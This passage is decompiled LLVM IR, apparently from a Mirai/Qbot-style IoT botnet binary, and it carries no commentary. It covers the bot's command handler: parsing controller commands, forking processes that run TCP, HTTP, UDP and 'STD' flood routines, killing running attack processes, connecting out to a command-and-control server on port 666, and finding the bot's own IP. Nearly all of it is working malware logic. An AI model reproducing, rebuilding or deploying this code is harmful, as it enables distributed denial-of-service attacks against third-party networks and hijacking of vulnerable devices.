  %v0_10e40 = call i32 @listFork()
  %v2_10e48 = icmp eq i32 %v0_10e40, 0
  br i1 %v2_10e48, label %dec_label_pc_10e50, label %dec_label_pc_10e84

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e40
  %v7_10e78 = call i32 @sendTCP(i32 %v2_10cc4, i32 %v1_10cdc, i32 %v1_10cf8, i32 %v1_10d14, i32 %v2_10d28, i32 %storemerge5, i32 %storemerge6)
  %v1_10e80 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10e84

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e1c, %dec_label_pc_10dbc, %dec_label_pc_10e40, %dec_label_pc_10ba0, %dec_label_pc_10e50
  %v2_10e88 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1fc7c.741 to i32), i32* @r1, align 4
  %v3_10e94 = inttoptr i32 %v2_10e88 to i8*
  %v4_10e94 = call i32 @__GI_strcoll(i8* %v3_10e94, i32 ptrtoint ([5 x i8]* @global_var_1fc7c.741 to i32))
  %v2_10e9c = icmp eq i32 %v4_10e94, 0
  br i1 %v2_10e9c, label %dec_label_pc_10ea4, label %dec_label_pc_1107c

dec_label_pc_10ea4:                               ; preds = %dec_label_pc_10e84
  %v7_10eac = icmp slt i32 %arg1, 6
  br i1 %v7_10eac, label %dec_label_pc_11370, label %dec_label_pc_10eb0

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea4
  %v1_10eb4 = add i32 %tmp, 4
  %v1_10eb8 = inttoptr i32 %v1_10eb4 to i32*
  %v2_10eb8 = load i32, i32* %v1_10eb8, align 4
  store i32 %v2_10eb8, i32* @r0, align 4
  %v2_10ec4 = call i32 @__GI_strchr(i32 %v2_10eb8, i32 44)
  store i32 %v2_10ec4, i32* @r0, align 4
  %v2_10ecc = icmp eq i32 %v2_10ec4, 0
  br i1 %v2_10ecc, label %dec_label_pc_10fcc, label %dec_label_pc_10ed4

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10eb0
  %v2_10edc = load i32, i32* %v1_10eb8, align 4
  %v2_10ee8 = call i32 @__GI_strtok(i32 %v2_10edc, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10ee8, i32* @r0, align 4
  %v2_10fc023 = icmp eq i32 %v2_10ee8, 0
  br i1 %v2_10fc023, label %dec_label_pc_1107c, label %dec_label_pc_10ef8.lr.ph

dec_label_pc_10ef8.lr.ph:                         ; preds = %dec_label_pc_10ed4
  %v1_10f18 = add i32 %tmp, 8
  %v1_10f1c = inttoptr i32 %v1_10f18 to i32*
  %v1_10f28 = add i32 %tmp, 12
  %v1_10f2c = inttoptr i32 %v1_10f28 to i32*
  %v1_10f48 = add i32 %tmp, 16
  %v1_10f4c = inttoptr i32 %v1_10f48 to i32*
  %v1_10f58 = add i32 %tmp, 20
  %v1_10f5c = inttoptr i32 %v1_10f58 to i32*
  %v1_10f70 = add i32 %tmp, 24
  %v1_10f74 = inttoptr i32 %v1_10f70 to i32*
  br label %dec_label_pc_10ef8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10ef8.lr.ph, %dec_label_pc_10fa8
  %v0_10ef8 = call i32 @listFork()
  %v2_10f00 = icmp eq i32 %v0_10ef8, 0
  br i1 %v2_10f00, label %dec_label_pc_10f08, label %dec_label_pc_10fa8

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ef8
  %v2_10f10 = load i32, i32* %v1_10eb8, align 4
  store i32 %v2_10f10, i32* @r5, align 4
  %v2_10f1c = load i32, i32* %v1_10f1c, align 4
  store i32 %v2_10f1c, i32* @r6, align 4
  %v2_10f2c = load i32, i32* %v1_10f2c, align 4
  store i32 %v2_10f2c, i32* @r0, align 4
  %v1_10f34 = call i32 @atol(i32 %v2_10f2c)
  %v3_10f40 = urem i32 %v1_10f34, 65536
  store i32 %v3_10f40, i32* @r7, align 4
  %v2_10f4c = load i32, i32* %v1_10f4c, align 4
  store i32 %v2_10f4c, i32* @r8, align 4
  %v2_10f5c = load i32, i32* %v1_10f5c, align 4
  store i32 %v2_10f5c, i32* @r0, align 4
  %v1_10f64 = call i32 @atol(i32 %v2_10f5c)
  store i32 %v1_10f64, i32* @r4, align 4
  %v2_10f74 = load i32, i32* %v1_10f74, align 4
  store i32 %v2_10f74, i32* @r0, align 4
  %v1_10f7c = call i32 @atol(i32 %v2_10f74)
  %v0_10f84 = load i32, i32* @r4, align 4
  %v0_10f8c = load i32, i32* @r5, align 4
  %v0_10f90 = load i32, i32* @r6, align 4
  %v0_10f94 = load i32, i32* @r7, align 4
  %v0_10f98 = load i32, i32* @r8, align 4
  %v6_10f9c = trunc i32 %v0_10f94 to i16
  %v7_10f9c = call i32 @sendHTTP(i32 %v0_10f8c, i32 %v0_10f90, i16 %v6_10f9c, i32 %v0_10f98, i32 %v0_10f84, i32 %v1_10f7c)
  %v1_10fa4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10fa8

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10f08
  %v2_10fb0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_10fb0, i32* @r0, align 4
  %v2_10fc0 = icmp eq i32 %v2_10fb0, 0
  br i1 %v2_10fc0, label %dec_label_pc_1107c, label %dec_label_pc_10ef8

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10eb0
  %v0_10fcc = call i32 @listFork()
  %v2_10fd4 = icmp eq i32 %v0_10fcc, 0
  br i1 %v2_10fd4, label %dec_label_pc_10fdc, label %dec_label_pc_11370

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_10fcc
  %v2_10fe4 = load i32, i32* %v1_10eb8, align 4
  store i32 %v2_10fe4, i32* @r5, align 4
  %v1_10fec = add i32 %tmp, 8
  %v1_10ff0 = inttoptr i32 %v1_10fec to i32*
  %v2_10ff0 = load i32, i32* %v1_10ff0, align 4
  store i32 %v2_10ff0, i32* @r6, align 4
  %v1_10ffc = add i32 %tmp, 12
  %v1_11000 = inttoptr i32 %v1_10ffc to i32*
  %v2_11000 = load i32, i32* %v1_11000, align 4
  store i32 %v2_11000, i32* @r0, align 4
  %v1_11008 = call i32 @atol(i32 %v2_11000)
  %v3_11014 = urem i32 %v1_11008, 65536
  store i32 %v3_11014, i32* @r7, align 4
  %v1_1101c = add i32 %tmp, 16
  %v1_11020 = inttoptr i32 %v1_1101c to i32*
  %v2_11020 = load i32, i32* %v1_11020, align 4
  store i32 %v2_11020, i32* @r8, align 4
  %v1_1102c = add i32 %tmp, 20
  %v1_11030 = inttoptr i32 %v1_1102c to i32*
  %v2_11030 = load i32, i32* %v1_11030, align 4
  store i32 %v2_11030, i32* @r0, align 4
  %v1_11038 = call i32 @atol(i32 %v2_11030)
  store i32 %v1_11038, i32* @r4, align 4
  %v1_11044 = add i32 %tmp, 24
  %v1_11048 = inttoptr i32 %v1_11044 to i32*
  %v2_11048 = load i32, i32* %v1_11048, align 4
  store i32 %v2_11048, i32* @r0, align 4
  %v1_11050 = call i32 @atol(i32 %v2_11048)
  %v0_11058 = load i32, i32* @r4, align 4
  %v0_11060 = load i32, i32* @r5, align 4
  %v0_11064 = load i32, i32* @r6, align 4
  %v0_11068 = load i32, i32* @r7, align 4
  %v0_1106c = load i32, i32* @r8, align 4
  %v6_11070 = trunc i32 %v0_11068 to i16
  %v7_11070 = call i32 @sendHTTP(i32 %v0_11060, i32 %v0_11064, i16 %v6_11070, i32 %v0_1106c, i32 %v0_11058, i32 %v1_11050)
  %v1_11078 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1107c

dec_label_pc_1107c:                               ; preds = %dec_label_pc_10fa8, %dec_label_pc_10ed4, %dec_label_pc_10e84, %dec_label_pc_10fdc
  %v2_11080 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1fc84.743 to i32), i32* @r1, align 4
  %v3_1108c = inttoptr i32 %v2_11080 to i8*
  %v4_1108c = call i32 @__GI_strcoll(i8* %v3_1108c, i32 ptrtoint ([4 x i8]* @global_var_1fc84.743 to i32))
  %v2_11094 = icmp eq i32 %v4_1108c, 0
  br i1 %v2_11094, label %dec_label_pc_1109c, label %dec_label_pc_111f4

dec_label_pc_1109c:                               ; preds = %dec_label_pc_1107c
  %v7_110a4 = icmp slt i32 %arg1, 4
  br i1 %v7_110a4, label %dec_label_pc_110e8, label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %dec_label_pc_1109c
  %v1_110ac = add i32 %tmp, 8
  %v1_110b0 = inttoptr i32 %v1_110ac to i32*
  %v2_110b0 = load i32, i32* %v1_110b0, align 4
  store i32 %v2_110b0, i32* @r0, align 4
  %v1_110b8 = call i32 @atol(i32 %v2_110b0)
  %tmp85 = icmp slt i32 %v1_110b8, 1
  br i1 %tmp85, label %dec_label_pc_110e8, label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110a8
  %v1_110cc = add i32 %tmp, 12
  %v1_110d0 = inttoptr i32 %v1_110cc to i32*
  %v2_110d0 = load i32, i32* %v1_110d0, align 4
  store i32 %v2_110d0, i32* @r0, align 4
  %v1_110d8 = call i32 @atol(i32 %v2_110d0)
  %v5_110e4 = icmp sgt i32 %v1_110d8, 0
  br i1 %v5_110e4, label %dec_label_pc_11100, label %dec_label_pc_110e8

dec_label_pc_110e8:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_110a8, %dec_label_pc_1109c
  %v2_110ec = load i32, i32* @global_var_299a0.50, align 4
  %v3_110f8 = call i32 @sockprintf(i32 %v2_110ec, i32 ptrtoint ([27 x i8]* @global_var_1fc88.745 to i32))
  br label %dec_label_pc_11370

dec_label_pc_11100:                               ; preds = %dec_label_pc_110c8
  %v1_11104 = add i32 %tmp, 4
  %v1_11108 = inttoptr i32 %v1_11104 to i32*
  %v2_11108 = load i32, i32* %v1_11108, align 4
  %v2_11118 = load i32, i32* %v1_110b0, align 4
  store i32 %v2_11118, i32* @r0, align 4
  %v1_11120 = call i32 @atol(i32 %v2_11118)
  %v2_11134 = load i32, i32* %v1_110d0, align 4
  store i32 %v2_11134, i32* @r0, align 4
  %v1_1113c = call i32 @atol(i32 %v2_11134)
  store i32 %v2_11108, i32* @r0, align 4
  %v2_11154 = call i32 @__GI_strchr(i32 %v2_11108, i32 44)
  store i32 %v2_11154, i32* @r0, align 4
  %v2_1115c = icmp eq i32 %v2_11154, 0
  br i1 %v2_1115c, label %dec_label_pc_111cc, label %dec_label_pc_11164

dec_label_pc_11164:                               ; preds = %dec_label_pc_11100
  %v2_11170 = call i32 @__GI_strtok(i32 %v2_11108, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_11170, i32* @r0, align 4
  %v2_111c020 = icmp eq i32 %v2_11170, 0
  br i1 %v2_111c020, label %dec_label_pc_111f4, label %dec_label_pc_11180

dec_label_pc_11180:                               ; preds = %dec_label_pc_11164, %dec_label_pc_111a8
  %storemerge1221 = phi i32 [ %v2_111b0, %dec_label_pc_111a8 ], [ %v2_11170, %dec_label_pc_11164 ]
  %v0_11180 = call i32 @listFork()
  %v2_11188 = icmp eq i32 %v0_11180, 0
  br i1 %v2_11188, label %dec_label_pc_11190, label %dec_label_pc_111a8

dec_label_pc_11190:                               ; preds = %dec_label_pc_11180
  %v4_1119c = call i32 @sendSTD(i32 %storemerge1221, i32 %v1_11120, i32 %v1_1113c, i32 0)
  %v1_111a4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11180, %dec_label_pc_11190
  %v2_111b0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f7b4.566 to i32))
  store i32 %v2_111b0, i32* @r0, align 4
  %v2_111c0 = icmp eq i32 %v2_111b0, 0
  br i1 %v2_111c0, label %dec_label_pc_111f4, label %dec_label_pc_11180

dec_label_pc_111cc:                               ; preds = %dec_label_pc_11100
  %v0_111cc = call i32 @listFork()
  %v2_111d4 = icmp eq i32 %v0_111cc, 0
  br i1 %v2_111d4, label %dec_label_pc_111dc, label %dec_label_pc_11370

dec_label_pc_111dc:                               ; preds = %dec_label_pc_111cc
  %v4_111e8 = call i32 @sendSTD(i32 %v2_11108, i32 %v1_11120, i32 %v1_1113c, i32 0)
  %v1_111f0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_111f4

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111a8, %dec_label_pc_11164, %dec_label_pc_1107c, %dec_label_pc_111dc
  %v2_111f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1fca4.747 to i32), i32* @r1, align 4
  %v3_11204 = inttoptr i32 %v2_111f8 to i8*
  %v4_11204 = call i32 @__GI_strcoll(i8* %v3_11204, i32 ptrtoint ([9 x i8]* @global_var_1fca4.747 to i32))
  store i32 %v4_11204, i32* @r0, align 4
  %v2_1120c = icmp eq i32 %v4_11204, 0
  br i1 %v2_1120c, label %dec_label_pc_11214, label %dec_label_pc_11348

dec_label_pc_11214:                               ; preds = %dec_label_pc_111f4
  br label %dec_label_pc_112b8

dec_label_pc_11228:                               ; preds = %dec_label_pc_112b8, %dec_label_pc_112ec
  %v3_1122c = mul i32 %storemerge10, 4
  %v2_11238 = load i32, i32* @global_var_2fc08.71, align 4
  %v2_1123c = add i32 %v2_11238, %v3_1122c
  %v1_11240 = inttoptr i32 %v2_1123c to i32*
  %v2_11240 = load i32, i32* %v1_11240, align 4
  %v2_11244 = icmp eq i32 %v2_11240, 0
  br i1 %v2_11244, label %dec_label_pc_112ac, label %dec_label_pc_1124c

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11228
  %v2_11264 = load i32, i32* %v1_11240, align 4
  store i32 %v2_11264, i32* @r4, align 4
  %v0_11268 = call i32 @__GI_getpid()
  store i32 %v0_11268, i32* @r0, align 4
  %v0_11270 = load i32, i32* @r4, align 4
  %v9_11270 = icmp eq i32 %v0_11270, %v0_11268
  br i1 %v9_11270, label %dec_label_pc_112ac, label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_1124c
  %v2_11288 = load i32, i32* @global_var_2fc08.71, align 4
  %v2_1128c = add i32 %v2_11288, %v3_1122c
  %v1_11290 = inttoptr i32 %v2_1128c to i32*
  %v2_11290 = load i32, i32* %v1_11290, align 4
  %v2_1129c = call i32 @kill(i32 %v2_11290, i32 9)
  store i32 %v2_1129c, i32* @r0, align 4
  %v1_112a4 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %dec_label_pc_1124c, %dec_label_pc_11228, %dec_label_pc_11278
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_11228 ], [ %stack_var_-48.1, %dec_label_pc_1124c ], [ %v1_112a4, %dec_label_pc_11278 ]
  %v1_112b0 = add i32 %storemerge10, 1
  br label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %dec_label_pc_11214, %dec_label_pc_112ac
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_11214 ], [ %stack_var_-48.0, %dec_label_pc_112ac ]
  %storemerge10 = phi i32 [ 0, %dec_label_pc_11214 ], [ %v1_112b0, %dec_label_pc_112ac ]
  %v5_112d0 = load i32, i32* @global_var_299ac.69, align 4
  %v9_112e4 = icmp eq i32 %v5_112d0, 0
  br i1 %v9_112e4, label %dec_label_pc_112ec, label %dec_label_pc_11228

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112b8
  %v2_112d0 = load i32, i32* @global_var_299a8.68, align 4
  store i32 0, i32* @r2, align 4
  %tmp87 = icmp ugt i32 %v2_112d0, %storemerge10
  br i1 %tmp87, label %dec_label_pc_11228, label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112ec
  %tmp86 = icmp slt i32 %stack_var_-48.1, 1
  %v2_11338 = load i32, i32* @global_var_299a0.50, align 4
  br i1 %tmp86, label %dec_label_pc_11334, label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_1130c
  store i32 %stack_var_-48.1, i32* @r2, align 4
  %v3_1132c = call i32 @sockprintf(i32 %v2_11338, i32 ptrtoint ([11 x i8]* @global_var_1fcb0.751 to i32))
  br label %dec_label_pc_11348

dec_label_pc_11334:                               ; preds = %dec_label_pc_1130c
  %v3_11344 = call i32 @sockprintf(i32 %v2_11338, i32 ptrtoint ([13 x i8]* @global_var_1fcbc.753 to i32))
  br label %dec_label_pc_11348

dec_label_pc_11348:                               ; preds = %dec_label_pc_111f4, %dec_label_pc_11318, %dec_label_pc_11334
  %v2_1134c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1fccc.755 to i32), i32* @r1, align 4
  %v3_11358 = inttoptr i32 %v2_1134c to i8*
  %v4_11358 = call i32 @__GI_strcoll(i8* %v3_11358, i32 ptrtoint ([10 x i8]* @global_var_1fccc.755 to i32))
  %v2_11360 = icmp eq i32 %v4_11358, 0
  br i1 %v2_11360, label %dec_label_pc_11368, label %dec_label_pc_11370

dec_label_pc_11368:                               ; preds = %dec_label_pc_11348
  %v1_1136c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_10b30, %dec_label_pc_10ac8, %dec_label_pc_10fcc, %dec_label_pc_111cc, %dec_label_pc_11348, %dec_label_pc_10b54, %dec_label_pc_106e0, %dec_label_pc_10ea4, %dec_label_pc_10678, %dec_label_pc_110e8, %dec_label_pc_10ca4, %dec_label_pc_10960, %dec_label_pc_107f4, %dec_label_pc_10718, %dec_label_pc_10610, %dec_label_pc_105d8, %dec_label_pc_11368
  %v1_11378 = phi i32 [ %v0_10fcc, %dec_label_pc_10fcc ], [ %v0_111cc, %dec_label_pc_111cc ], [ %v4_11358, %dec_label_pc_11348 ], [ %v0_10b54, %dec_label_pc_10b54 ], [ 0, %dec_label_pc_106e0 ], [ 0, %dec_label_pc_10ea4 ], [ 0, %dec_label_pc_10678 ], [ %v3_110f8, %dec_label_pc_110e8 ], [ %v3_10cb4, %dec_label_pc_10ca4 ], [ %v3_10970, %dec_label_pc_10960 ], [ %v3_10818, %dec_label_pc_107f4 ], [ %v0_106f0, %dec_label_pc_10718 ], [ %v3_1062c, %dec_label_pc_10610 ], [ %v3_105e8, %dec_label_pc_105d8 ], [ %v1_1136c, %dec_label_pc_11368 ], [ 0, %dec_label_pc_10ac8 ], [ 0, %dec_label_pc_10b30 ]
  store i32 %v3_105a4, i32* @r4, align 4
  store i32 %v6_105a4, i32* @r5, align 4
  store i32 %v9_105a4, i32* @r6, align 4
  store i32 %v12_105a4, i32* @r7, align 4
  store i32 %v15_105a4, i32* @r8, align 4
  store i32 %v18_105a4, i32* @fp, align 4
  ret i32 %v1_11378

; uselistorder directives
  uselistorder i32 %v2_11338, { 1, 0 }
  uselistorder i32 %stack_var_-48.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_1122c, { 1, 0 }
  uselistorder i32 %v2_111b0, { 2, 1, 0 }
  uselistorder i32 %v1_1113c, { 1, 0 }
  uselistorder i32 %v1_11120, { 1, 0 }
  uselistorder i32 %v2_11108, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10fb0, { 1, 0 }
  uselistorder i32* %v1_10eb8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_10e24, { 2, 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %v1_10d14, { 1, 0 }
  uselistorder i32 %v1_10cf8, { 1, 0 }
  uselistorder i32 %v1_10cdc, { 1, 0 }
  uselistorder i32 %v2_10cc4, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10b38, { 2, 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_109d0, { 1, 0 }
  uselistorder i32 %v1_109b4, { 1, 0 }
  uselistorder i32 %v1_10998, { 1, 0 }
  uselistorder i32 %v2_10980, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 10, 11, 12, 13, 14, 15, 16, 17, 5, 6, 7, 8, 9, 18, 4, 19, 20, 21, 22, 3, 23, 24, 25, 2, 1, 0, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f7b4.566 to i32), { 2, 3, 1, 4, 0, 5, 6, 7, 8, 9 }
  uselistorder i32* @global_var_2fc04.715, { 0, 2, 1, 3 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1e93c.52 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_11370, { 16, 4, 3, 9, 2, 7, 10, 5, 0, 1, 11, 12, 13, 6, 8, 14, 15 }
  uselistorder label %dec_label_pc_11348, { 2, 1, 0 }
  uselistorder label %dec_label_pc_112b8, { 1, 0 }
  uselistorder label %dec_label_pc_112ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11228, { 1, 0 }
  uselistorder label %dec_label_pc_111f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_111a8, { 1, 0 }
  uselistorder label %dec_label_pc_11180, { 1, 0 }
  uselistorder label %dec_label_pc_1107c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10e84, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10d98, { 1, 0 }
  uselistorder label %dec_label_pc_10d60, { 1, 0 }
  uselistorder label %dec_label_pc_10cbc, { 1, 0 }
  uselistorder label %dec_label_pc_10ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10b30, { 1, 0 }
  uselistorder label %dec_label_pc_10ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10aa4, { 1, 0 }
  uselistorder label %dec_label_pc_10a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10a28, { 1, 0 }
  uselistorder label %dec_label_pc_10978, { 1, 0 }
  uselistorder label %dec_label_pc_107d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10770, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106bc, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_113f8 = load i32, i32* @fp, align 4
  store i32 70656, i32* %stack_var_-4, align 4
  %v2_113fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_113fc, i32* @fp, align 4
  %v2_11410 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_11420 = bitcast i32* %stack_var_-4116 to i8*
  %v3_11420 = call i32 @__GI_memset(i8* %v2_11420, i32 0)
  %v2_11428 = load i32, i32* @global_var_299a0.50, align 4
  %v2_1142c = icmp eq i32 %v2_11428, 0
  br i1 %v2_1142c, label %dec_label_pc_11450, label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %entry
  %v1_11440 = call i32 @__GI_close(i32 %v2_11428)
  store i32 0, i32* @global_var_299a0.50, align 4
  br label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %entry, %dec_label_pc_11434
  %v2_11454 = load i32, i32* @global_var_29658.758, align 4
  %v2_11458 = icmp eq i32 %v2_11454, 0
  br i1 %v2_11458, label %dec_label_pc_11484, label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %dec_label_pc_11450
  %v1_11478 = add i32 %v2_11454, 1
  br label %dec_label_pc_11484

dec_label_pc_11484:                               ; preds = %dec_label_pc_11450, %dec_label_pc_11470
  %storemerge1 = phi i32 [ %v1_11478, %dec_label_pc_11470 ], [ 0, %dec_label_pc_11450 ]
  store i32 %storemerge1, i32* @global_var_29658.758, align 4
  %v4_1149c = mul i32 %storemerge1, 4
  %v5_1149c = add i32 %v4_1149c, ptrtoint ([19 x i8]** @global_var_29654.760 to i32)
  %v6_1149c = inttoptr i32 %v5_1149c to i32*
  %v7_1149c = load i32, i32* %v6_1149c, align 4
  store i32 %v7_1149c, i32* @r1, align 4
  %v3_114a8 = call i32 @strcpy(i8* %v2_11420, i32 %v7_1149c)
  store i32 %v2_11410, i32* @r0, align 4
  %v2_114cc = call i32 @__GI_strchr(i32 %v2_11410, i32 58)
  %v2_114d4 = icmp eq i32 %v2_114cc, 0
  br i1 %v2_114d4, label %dec_label_pc_11534, label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %dec_label_pc_11484
  store i32 %v2_11410, i32* @r0, align 4
  %v2_114f0 = call i32 @__GI_strchr(i32 %v2_11410, i32 58)
  %v1_114f8 = add i32 %v2_114f0, 1
  store i32 %v1_114f8, i32* @r0, align 4
  %v1_11500 = call i32 @atol(i32 %v1_114f8)
  store i32 %v2_11410, i32* @r0, align 4
  %v2_11520 = call i32 @__GI_strchr(i32 %v2_11410, i32 58)
  %v3_11530 = inttoptr i32 %v2_11520 to i8*
  store i8 0, i8* %v3_11530, align 1
  br label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_11484, %dec_label_pc_114dc
  %stack_var_-20.0 = phi i32 [ 666, %dec_label_pc_11484 ], [ %v1_11500, %dec_label_pc_114dc ]
  %v3_11540 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_11540, i32* @global_var_299a0.50, align 4
  %v4_11574 = call i32 @connectTimeout(i32 %v3_11540, i32 %v2_11410, i32 %stack_var_-20.0, i32 30)
  %v2_1157c = icmp eq i32 %v4_11574, 0
  %. = zext i1 %v2_1157c to i32
  store i32 %v3_113f8, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_11410, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_11534, { 1, 0 }
  uselistorder label %dec_label_pc_11484, { 1, 0 }
  uselistorder label %dec_label_pc_11450, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_115c8 = load i32, i32* @fp, align 4
  store i32 %v3_115c8, i32* %stack_var_-16, align 4
  %v3_115e4 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_115f4 = icmp eq i32 %v3_115e4, -1
  br i1 %v3_115f4, label %dec_label_pc_115fc, label %dec_label_pc_1160c

dec_label_pc_115fc:                               ; preds = %entry
  br label %dec_label_pc_11848

dec_label_pc_1160c:                               ; preds = %entry
  %v2_1160c = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_1161c = bitcast i32* %stack_var_-52 to i8*
  %v3_1161c = call i32 @__GI_memset(i8* %v2_1161c, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1fcd8.762 to i32), i32* @r0, align 4
  %v2_1162c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1fcd8.762 to i32))
  %v1_1163c = call i32 @__GI_htons(i32 53)
  %v3_11658 = call i32 @__libc_connect(i32 %v3_115e4, i32 %v2_1160c, i32 16)
  %v3_11668 = icmp eq i32 %v3_11658, -1
  br i1 %v3_11668, label %dec_label_pc_11670, label %dec_label_pc_11680

dec_label_pc_11670:                               ; preds = %dec_label_pc_1160c
  br label %dec_label_pc_11848

dec_label_pc_11680:                               ; preds = %dec_label_pc_1160c
  store i32 16, i32* %stack_var_-72, align 4
  %v2_11688 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1168c = ptrtoint i32* %stack_var_-72 to i32
  %v5_11698 = call i32 @__GI_getsockname(i32 %v3_115e4, i32 %v2_11688, i32 %v2_1168c, i32 %v2_11688, i32 16)
  %v3_116a8 = icmp eq i32 %v5_11698, -1
  br i1 %v3_116a8, label %dec_label_pc_116b0, label %dec_label_pc_116c0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11680
  br label %dec_label_pc_11848

dec_label_pc_116c0:                               ; preds = %dec_label_pc_11680
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2fbfc.475 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_2fbfc.475, align 4
  %v3_116d4 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_1fce0.765 to i32), i32 0)
  %v2_1176c = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_11764

dec_label_pc_116e4:                               ; preds = %dec_label_pc_11764
  %v4_116f8 = call i32 @strstr(i32 %v2_1176c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1fcf0.767, i32 0, i32 0))
